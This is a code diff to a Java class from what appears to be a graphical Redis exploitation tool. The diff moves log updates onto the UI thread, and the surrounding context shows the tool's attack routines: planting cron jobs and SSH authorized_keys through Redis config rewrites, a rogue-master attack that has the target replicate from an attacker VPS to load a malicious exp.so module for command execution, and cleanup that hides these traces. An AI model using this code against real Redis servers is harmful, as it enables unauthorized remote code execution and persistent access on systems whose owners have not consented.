@@ -93,12 +93,16 @@ public class RedisDao {
 
     public void redisslave(String vpsIp, String vpsPort) {
         try {
-            redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
+            });
             // 开启主从
             CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));
 
         } catch (Exception e) {
-            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            });
         }
     }
 
@@ -111,12 +115,19 @@ public class RedisDao {
                 CONN.configSet("dir", dir);
                 CONN.configSet("dbfilename", "root");
                 CONN.save();
-                redisController.redisLogTextFArea.appendText(Utils.log(cronText + "\n" + "write cron success: " + dir + "root"));
+                Platform.runLater(() -> {
+                    redisController.redisLogTextFArea.appendText(Utils.log(cronText + "\n" + "write cron success: " + dir + "root"));
+                });
             } catch (Exception e) {
-                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+                Platform.runLater(() -> {
+                    redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+                });
             }
         }
-        redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
+        });
+
     }
 
     public void sshkey(String sshRsa) {
@@ -126,20 +137,27 @@ public class RedisDao {
             CONN.configSet("dbfilename", "authorized_keys");
             CONN.save();
         } catch (Exception e) {
-            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            });
         }
-        redisController.redisLogTextFArea.appendText(Utils.log("write ssh rsa success: " + sshRsa));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("write ssh rsa success: " + sshRsa));
+        });
     }
 
     public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
         redisslave(vpsip, vpsport);
 
-        redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
+        });
         List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
         slaveReadOnlyFlag = slaveReadOnlyList.get(1);
 
-        redisController.redisLogTextFArea.appendText(Utils.log("slave-read-only -> no ..."));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("slave-read-only -> no ..."));
+        });
         CONN.configSet("slave-read-only", "no");
 
         // 配置so文件
@@ -155,8 +173,9 @@ public class RedisDao {
 
         //关闭主从
         CONN.slaveofNoOne();
-
-        redisController.redisLogTextFArea.appendText(Utils.log("success write exp.so ..."));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("success write exp.so ..."));
+        });
 
     }
 
@@ -181,7 +200,9 @@ public class RedisDao {
             byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
             result = (new String(bytes, code));
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
         return result;
     }
@@ -193,27 +214,35 @@ public class RedisDao {
      */
     public void clean() {
         CONN.configSet("dir", dir.get(1));
-        redisController.redisLogTextFArea.appendText(Utils.log("reset dir success"));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("reset dir success"));
+        });
 
         CONN.configSet("slave-read-only", slaveReadOnlyFlag);
-        redisController.redisLogTextFArea.appendText(Utils.log("reset slave-read-only success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("reset slave-read-only success"));
+        });
         CONN.configSet("dbfilename", "dump.rdb");
-        redisController.redisLogTextFArea.appendText(Utils.log("reset dbfilename success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("reset dbfilename success"));
+        });
         CONN.slaveofNoOne();
-        redisController.redisLogTextFArea.appendText(Utils.log("reset slaveof success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("reset slaveof success"));
+        });
         eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
-        redisController.redisLogTextFArea.appendText(Utils.log("remove exp file success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("remove exp file success"));
+        });
         CONN.moduleUnload("system");
-        redisController.redisLogTextFArea.appendText(Utils.log("unload system.exec success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("unload system.exec success"));
+        });
         CONN.del("xxssh");
         CONN.del("xxcron");
-        redisController.redisLogTextFArea.appendText(Utils.log("delete exp key success"));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("delete exp key success"));
+        });
     }
 
 }
